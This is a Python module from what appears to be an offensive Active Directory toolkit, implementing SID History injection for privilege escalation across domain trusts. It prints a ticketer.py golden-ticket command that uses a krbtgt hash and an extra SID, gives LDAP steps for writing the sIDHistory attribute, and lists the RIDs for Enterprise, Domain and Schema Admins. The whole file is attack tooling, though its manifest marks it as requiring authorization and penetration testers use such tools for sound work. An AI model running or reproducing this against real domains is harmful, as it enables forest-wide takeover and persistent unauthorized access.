"""SID History injection — cross-trust escalation via SID history attribute."""
from __future__ import annotations
import sys
from typing import Any
from adxpl.core.credential import ADCredential

MANIFEST = {
    "capability_id": "adxpl.trust.sid_history_inject.v1",
    "safety_class": "ACTIVE",
    "requires_authorization": True,
    "side_effects": ["ldap_modification", "sid_history_change"],
    "output_schema": "xpl.finding.v1",
    "mitre": ["T1134.005"],
}


def run(args: Any) -> int:
    cred = ADCredential.from_args(args)
    target_user = getattr(args, "target_user", None)
    target_sid = getattr(args, "target_sid", None)
    dc_ip = getattr(args, "dc_ip", args.target)
    krbtgt_hash = getattr(args, "krbtgt_hash", None)

    if not target_user or not target_sid:
        print("[!] --target-user and --target-sid required", file=sys.stderr)
        print("[*] target-sid: SID of the enterprise admin or domain admin in parent domain")
        return 1

    print("[*] SID History injection:")
    print("  Target user: {}".format(target_user))
    print("  Injected SID: {}".format(target_sid))
    print("  DC: {}".format(dc_ip))

    if krbtgt_hash:
        print("\n[*] Using Golden Ticket with extra SID (recommended):")
        print("  ticketer.py -nthash {} -domain-sid <child-SID> "
              "-extra-sid {} -domain {} {}".format(
                  krbtgt_hash, target_sid, args.domain, target_user))
    else:
        print("\n[*] Direct LDAP injection (requires high privileges):")
        print("  Modify sIDHistory attribute on {}".format(target_user))
        print("  Append SID: {}".format(target_sid))

    print("\n[*] Common target SIDs:")
    print("  Enterprise Admins: <forest-root-SID>-519")
    print("  Domain Admins:     <target-domain-SID>-512")
    print("  Schema Admins:     <forest-root-SID>-518")
    return 0
